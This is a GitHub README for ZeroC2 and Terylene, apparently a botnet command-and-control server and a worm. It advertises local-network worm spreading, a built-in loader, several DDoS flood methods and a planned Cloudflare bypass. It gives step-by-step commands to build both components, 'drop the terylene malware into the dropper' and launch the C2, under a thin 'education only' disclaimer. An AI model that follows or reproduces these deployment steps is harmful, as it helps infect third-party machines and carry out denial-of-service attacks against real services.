![ZeroC2](https://github.com/BishopFox/sliver/assets/93959737/37af624e-9935-40d2-b2ff-630c53e3ec21)


# WARNING
**THIS IS ONLY FOR EDUCATION PURPOSES**

**UTILIZING THIS FOR ACTUAL DDOS ATTACKS IS ABSOLUTELY CONDEMNED AND COULD RESULT IN SERIOUS LEGAL CONSEQUENCES**

## Still in DEVELOPMENT

ZeroC2 Features:
```diff
# Duplex heartbeat monitoring
# connection deduplication mechanism
# Made in Golang + ZeroMq
# able to handle over 500k botnets
# heartbeat sensor to track bots
# migration and transfer
# Decentralized
```

Terylene Features:
```diff
# Duplex heartbeat monitoring
# Retrying and Backoff mechanism
# Mother priority mechanism
# Made in Golang
# Able to scan and spread through local network
# Builtin Loader
# Fast concurrent Worm spreading
# UDP, TCP, UDPRAPE, Modified UDP, HTTP, SYN flood
```

Updated features:

```diff
+ fixed critical error and implemented thread safety
+ added "killall" command 
+ improved reconnection fault tolerance
+ fixed DDos methods
```


Upcoming features:
```diff
- more ddos methods
- custom methods
- Cloudflare Bypass
- New Mirai Varient that works with terylene
```

# [ZeroC2 wiki](https://github.com/polymaster3313/terylene/wiki/Introduction) 


# Debian based Setup
> Ubuntu , Debian , Kali, Parrot OS

### Install ZMQ + GO package using SNAP
```
sudo apt update
sudo apt upgrade
sudo apt-get install libzmq3-dev
sudo apt install snapd
snap install go --classic
```

# Arch based setup
> Arch , BlackArch

### Install ZMQ + GO package using pacman

```
sudo pacman -Sy
sudo pacman -S zeromq
sudo pacman -S go
```


# Red Hat based setup
> CentOs, Rocky , Fedora

### Install ZMQ package using yum

```
sudo yum update
sudo dnf makecache --refresh
sudo yum install -y zeromq-devel
sudo yum install golang
```


# ZeroC2 and terylene setup

### Clone the repo
```
git clone https://github.com/polymaster3313/terylene.git
```

### cd into the folder
```
cd terylene
```

### edit the configs in config folder.

```
cd config
nano config.go
```

### build terylene and ZeroC2

```
cd server
sudo go build server.go
cd ..
cd mirai
sudo go build -ldflags="-s -w" terylene.go
```

### drop the terylene malware into the dropper

```
mv terylene ../server/dropper
```

### start the zeroC2

```
./server
```

>Enjoy ;)



# ZeroMq and Terylene infrastructure


## duplex heart monitoring system

![ZeroC2](https://github.com/polymaster3313/Polyaccess/assets/93959737/ae1d8bba-2fa4-4446-8fee-f610667dbfd0)

## transfer and migration

![Migrationfinal(1)](https://github.com/polymaster3313/Polyaccess/assets/93959737/32e205e3-e817-4b5b-ad98-7593420b7589)

# connection deduplication


![connection deduplication](https://github.com/polymaster3313/Polyaccess/assets/93959737/d3afa189-bc73-439c-b575-d2b9fbb12d59)


## connection deduplication , Backoff and Retry Demonstration

https://github.com/polymaster3313/Polyaccess/assets/93959737/4315b8ee-97c6-4fa3-9be9-e0b54f3f1cf0

PS: If connection timed out (5h) , Terylene will pronounce the C2 as dead, **mother priority** will be activated

# Mother priority

![mother](https://github.com/polymaster3313/Polyaccess/assets/93959737/197b2d09-8b81-40b6-b73d-e5b14df6c5ff)

